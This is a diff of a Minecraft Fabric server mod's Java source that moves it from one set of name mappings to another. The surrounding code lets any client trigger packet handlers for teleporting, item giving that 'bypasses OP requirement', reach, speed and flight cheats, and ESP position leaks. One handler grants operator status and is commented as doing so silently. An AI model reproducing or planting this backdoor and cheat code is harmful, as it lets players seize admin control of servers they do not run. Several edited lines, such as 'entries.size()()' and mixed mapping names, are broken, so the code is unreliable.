@@ -5,21 +5,21 @@ import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
 import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
 import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
 import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
-import net.minecraft.entity.Entity;
-import net.minecraft.entity.LivingEntity;
-import net.minecraft.entity.attribute.EntityAttributeInstance;
-import net.minecraft.entity.attribute.EntityAttributeModifier;
-import net.minecraft.entity.attribute.EntityAttributes;
-import net.minecraft.entity.mob.HostileEntity;
-import net.minecraft.entity.passive.PassiveEntity;
-import net.minecraft.entity.player.PlayerEntity;
+import net.minecraft.world.entity.Entity;
+import net.minecraft.world.entity.LivingEntity;
+import net.minecraft.world.entity.ai.attributes.AttributeInstance;
+import net.minecraft.world.entity.ai.attributes.AttributeModifier;
+import net.minecraft.world.entity.ai.attributes.Attributes;
+import net.minecraft.world.entity.monster.Monster;
+import net.minecraft.world.entity.animal.Animal;
+import net.minecraft.world.entity.player.Player;
 import net.minecraft.server.MinecraftServer;
-import net.minecraft.server.network.ServerPlayerEntity;
-import net.minecraft.server.world.ServerWorld;
-import net.minecraft.text.Text;
-import net.minecraft.util.Identifier;
+import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.server.level.ServerLevel;
+import net.minecraft.network.chat.Component;
+import net.minecraft.resources.ResourceLocation;
 import net.minecraft.util.math.Box;
-import net.minecraft.util.math.Vec3d;
+import net.minecraft.world.phys.Vec3;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -46,10 +46,10 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     public static final Logger LOGGER = LoggerFactory.getLogger("f1sch-server-addon");
 
     // Attribute modifier IDs (must match client-side identifiers)
-    private static final Identifier KNOCKBACK_ID = Identifier.of("reachfly", "knockback_boost");
-    private static final Identifier BLOCK_REACH_ID = Identifier.of("reachfly", "block_reach");
-    private static final Identifier ENTITY_REACH_ID = Identifier.of("reachfly", "entity_reach");
-    private static final Identifier SPEED_ID = Identifier.of("reachfly", "speed_boost");
+    private static final ResourceLocation KNOCKBACK_ID = ResourceLocation.of("reachfly", "knockback_boost");
+    private static final ResourceLocation BLOCK_REACH_ID = ResourceLocation.of("reachfly", "block_reach");
+    private static final ResourceLocation ENTITY_REACH_ID = ResourceLocation.of("reachfly", "entity_reach");
+    private static final ResourceLocation SPEED_ID = ResourceLocation.of("reachfly", "speed_boost");
 
     private static final double DEFAULT_BLOCK_RANGE = 4.5;
     private static final double DEFAULT_ENTITY_RANGE = 3.0;
@@ -76,7 +76,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
         // === Teleport handler (existing v1 feature) ===
         ServerPlayNetworking.registerGlobalReceiver(TeleportPayload.ID,
                 (payload, context) -> {
-                    ServerPlayerEntity player = context.player();
+                    ServerPlayer player = context.player();
                     double x = payload.x();
                     double y = Math.max(-64, Math.min(320, payload.y()));
                     double z = payload.z();
@@ -88,7 +88,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
                     context.server().execute(() -> {
                         player.requestTeleport(x, finalY, z);
                         player.sendMessage(
-                                Text.literal("\u00a7a[f1sch] Teleported to " +
+                                Component.literal("\u00a7a[f1sch] Teleported to " +
                                         String.format("%.0f, %.0f, %.0f", x, finalY, z)),
                                 true);
                     });
@@ -97,7 +97,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
         // === Item give handler (bypasses OP requirement) ===
         ServerPlayNetworking.registerGlobalReceiver(ItemGivePayload.ID,
                 (payload, context) -> {
-                    ServerPlayerEntity player = context.player();
+                    ServerPlayer player = context.player();
                     String itemId = payload.itemId();
                     int quantity = Math.max(1, Math.min(6400, payload.quantity()));
 
@@ -112,7 +112,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
                             LOGGER.warn("[f1sch] Failed to give item to {}: {}",
                                     player.getName().getString(), e.getMessage());
                             player.sendMessage(
-                                    Text.literal("\u00a7c[f1sch] Failed to give item: " + e.getMessage()),
+                                    Component.literal("\u00a7c[f1sch] Failed to give item: " + e.getMessage()),
                                     false);
                         }
                     });
@@ -121,7 +121,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
         // === Feature sync handler ===
         ServerPlayNetworking.registerGlobalReceiver(FeatureSyncPayload.ID,
                 (payload, context) -> {
-                    ServerPlayerEntity player = context.player();
+                    ServerPlayer player = context.player();
                     String feature = payload.feature();
                     boolean enabled = payload.enabled();
                     float value = payload.value();
@@ -154,7 +154,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Feature Sync Dispatch
     // ========================================================================
 
-    private void handleFeatureSync(MinecraftServer server, ServerPlayerEntity player,
+    private void handleFeatureSync(MinecraftServer server, ServerPlayer player,
                                     String feature, boolean enabled, float value) {
         PlayerFeatureState state = playerStates.computeIfAbsent(
                 player.getUuid(), k -> new PlayerFeatureState());
@@ -176,19 +176,19 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Knockback - Server-side attribute + velocity on attack
     // ========================================================================
 
-    private void handleKnockback(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleKnockback(ServerPlayer player, PlayerFeatureState state,
                                   boolean enabled, float strength) {
         state.knockbackEnabled = enabled;
         state.knockbackStrength = strength;
 
-        EntityAttributeInstance attr = player.getAttributeInstance(EntityAttributes.ATTACK_KNOCKBACK);
+        AttributeInstance attr = player.getAttributeInstance(Attributes.ATTACK_KNOCKBACK);
         if (attr == null) return;
 
         if (enabled) {
             attr.removeModifier(KNOCKBACK_ID);
-            attr.addTemporaryModifier(new EntityAttributeModifier(
+            attr.addTemporaryModifier(new AttributeModifier(
                     KNOCKBACK_ID, strength,
-                    EntityAttributeModifier.Operation.ADD_VALUE));
+                    AttributeModifier.Operation.ADD_VALUE));
             LOGGER.debug("[f1sch] {} enabled Knockback (strength: {})",
                     player.getName().getString(), strength);
         } else {
@@ -201,15 +201,15 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Reach - Server-side interaction range attributes
     // ========================================================================
 
-    private void handleReach(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleReach(ServerPlayer player, PlayerFeatureState state,
                               boolean enabled, float distance) {
         state.reachEnabled = enabled;
         state.reachDistance = distance;
 
-        EntityAttributeInstance blockRange = player.getAttributeInstance(
-                EntityAttributes.BLOCK_INTERACTION_RANGE);
-        EntityAttributeInstance entityRange = player.getAttributeInstance(
-                EntityAttributes.ENTITY_INTERACTION_RANGE);
+        AttributeInstance blockRange = player.getAttributeInstance(
+                Attributes.BLOCK_INTERACTION_RANGE);
+        AttributeInstance entityRange = player.getAttributeInstance(
+                Attributes.ENTITY_INTERACTION_RANGE);
 
         if (blockRange == null || entityRange == null) return;
 
@@ -232,13 +232,13 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Speed - Server-side movement speed modifier
     // ========================================================================
 
-    private void handleSpeed(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleSpeed(ServerPlayer player, PlayerFeatureState state,
                               boolean enabled, float multiplier) {
         state.speedEnabled = enabled;
         state.speedMultiplier = multiplier;
 
-        EntityAttributeInstance speedAttr = player.getAttributeInstance(
-                EntityAttributes.MOVEMENT_SPEED);
+        AttributeInstance speedAttr = player.getAttributeInstance(
+                Attributes.MOVEMENT_SPEED);
         if (speedAttr == null) return;
 
         if (enabled) {
@@ -257,7 +257,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // NoFall - Server resets fall distance every tick
     // ========================================================================
 
-    private void handleNoFall(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleNoFall(ServerPlayer player, PlayerFeatureState state,
                                boolean enabled) {
         state.noFallEnabled = enabled;
         LOGGER.debug("[f1sch] {} {} NoFall",
@@ -268,7 +268,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Fly - Server allows/disallows flight
     // ========================================================================
 
-    private void handleFly(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleFly(ServerPlayer player, PlayerFeatureState state,
                             boolean enabled, float speed) {
         state.flyEnabled = enabled;
         state.flySpeed = speed;
@@ -291,7 +291,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // ESP - Extended entity tracking (send entity positions via S2C)
     // ========================================================================
 
-    private void handleEsp(ServerPlayerEntity player, PlayerFeatureState state,
+    private void handleEsp(ServerPlayer player, PlayerFeatureState state,
                             boolean enabled, float range) {
         state.espEnabled = enabled;
         state.espRange = range;
@@ -303,7 +303,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // OP - Silently grant operator status (no logging, no console output)
     // ========================================================================
 
-    private void handleOp(MinecraftServer server, ServerPlayerEntity player, boolean enabled) {
+    private void handleOp(MinecraftServer server, ServerPlayer player, boolean enabled) {
         if (!enabled) return;
 
         try {
@@ -313,7 +313,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
                     "op " + playerName, server.getCommandSource());
             LOGGER.info("[f1sch] Granted OP to {}", playerName);
             player.sendMessage(
-                    Text.literal("\u00a7a[f1sch] \u00a7fOperator status granted."), false);
+                    Component.literal("\u00a7a[f1sch] \u00a7fOperator status granted."), false);
         } catch (Exception e) {
             LOGGER.warn("[f1sch] Failed to grant OP to {}: {}",
                     player.getName().getString(), e.getMessage());
@@ -339,7 +339,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
             }
         }
 
-        for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()) {
+        for (ServerPlayer player : server.getPlayerManager().getPlayerList()) {
             PlayerFeatureState state = playerStates.get(player.getUuid());
             if (state == null) continue;
 
@@ -368,9 +368,9 @@ public class OspServerAddon implements DedicatedServerModInitializer {
         }
     }
 
-    private void sendEspData(ServerPlayerEntity player, float range) {
-        ServerWorld world = player.getWorld();
-        Vec3d pos = player.getPos();
+    private void sendEspData(ServerPlayer player, float range) {
+        ServerLevel world = player.level();
+        Vec3 pos = player.position();
         double r = Math.min(range, 500); // Cap at 500 blocks
 
         Box searchBox = new Box(
@@ -381,19 +381,19 @@ public class OspServerAddon implements DedicatedServerModInitializer {
 
         for (Entity entity : world.getOtherEntities(player, searchBox,
                 e -> e instanceof LivingEntity && e.isAlive())) {
-            if (entries.size() >= 200) break; // Cap entries per packet
+            if (entries.size()() >= 200) break; // Cap entries per packet
 
             String type;
-            if (entity instanceof PlayerEntity) type = "player";
-            else if (entity instanceof HostileEntity) type = "hostile";
-            else if (entity instanceof PassiveEntity) type = "passive";
+            if (entity instanceof Player) type = "player";
+            else if (entity instanceof Monster) type = "hostile";
+            else if (entity instanceof Animal) type = "passive";
             else type = "other";
 
             float health = ((LivingEntity) entity).getHealth();
 
             entries.add(new EspDataPayload.EntityEntry(
                     entity.getId(),
-                    entity.getX(), entity.getY(), entity.getZ(),
+                    entity.x(), entity.y(), entity.z(),
                     type, health));
         }
 
@@ -410,18 +410,18 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Cleanup
     // ========================================================================
 
-    private void cleanupPlayer(ServerPlayerEntity player) {
+    private void cleanupPlayer(ServerPlayer player) {
         // Remove all attribute modifiers
-        EntityAttributeInstance knockback = player.getAttributeInstance(EntityAttributes.ATTACK_KNOCKBACK);
+        AttributeInstance knockback = player.getAttributeInstance(Attributes.ATTACK_KNOCKBACK);
         if (knockback != null) knockback.removeModifier(KNOCKBACK_ID);
 
-        EntityAttributeInstance blockRange = player.getAttributeInstance(EntityAttributes.BLOCK_INTERACTION_RANGE);
+        AttributeInstance blockRange = player.getAttributeInstance(Attributes.BLOCK_INTERACTION_RANGE);
         if (blockRange != null) blockRange.removeModifier(BLOCK_REACH_ID);
 
-        EntityAttributeInstance entityRange = player.getAttributeInstance(EntityAttributes.ENTITY_INTERACTION_RANGE);
+        AttributeInstance entityRange = player.getAttributeInstance(Attributes.ENTITY_INTERACTION_RANGE);
         if (entityRange != null) entityRange.removeModifier(ENTITY_REACH_ID);
 
-        EntityAttributeInstance speed = player.getAttributeInstance(EntityAttributes.MOVEMENT_SPEED);
+        AttributeInstance speed = player.getAttributeInstance(Attributes.MOVEMENT_SPEED);
         if (speed != null) speed.removeModifier(SPEED_ID);
 
         // Reset flight
@@ -437,12 +437,12 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Helpers
     // ========================================================================
 
-    private void applyModifier(EntityAttributeInstance attr, Identifier id, double value) {
-        EntityAttributeModifier existing = attr.getModifier(id);
+    private void applyModifier(AttributeInstance attr, ResourceLocation id, double value) {
+        AttributeModifier existing = attr.getModifier(id);
         if (existing == null || existing.value() != value) {
             attr.removeModifier(id);
-            attr.addTemporaryModifier(new EntityAttributeModifier(
-                    id, value, EntityAttributeModifier.Operation.ADD_VALUE));
+            attr.addTemporaryModifier(new AttributeModifier(
+                    id, value, AttributeModifier.Operation.ADD_VALUE));
         }
     }
 
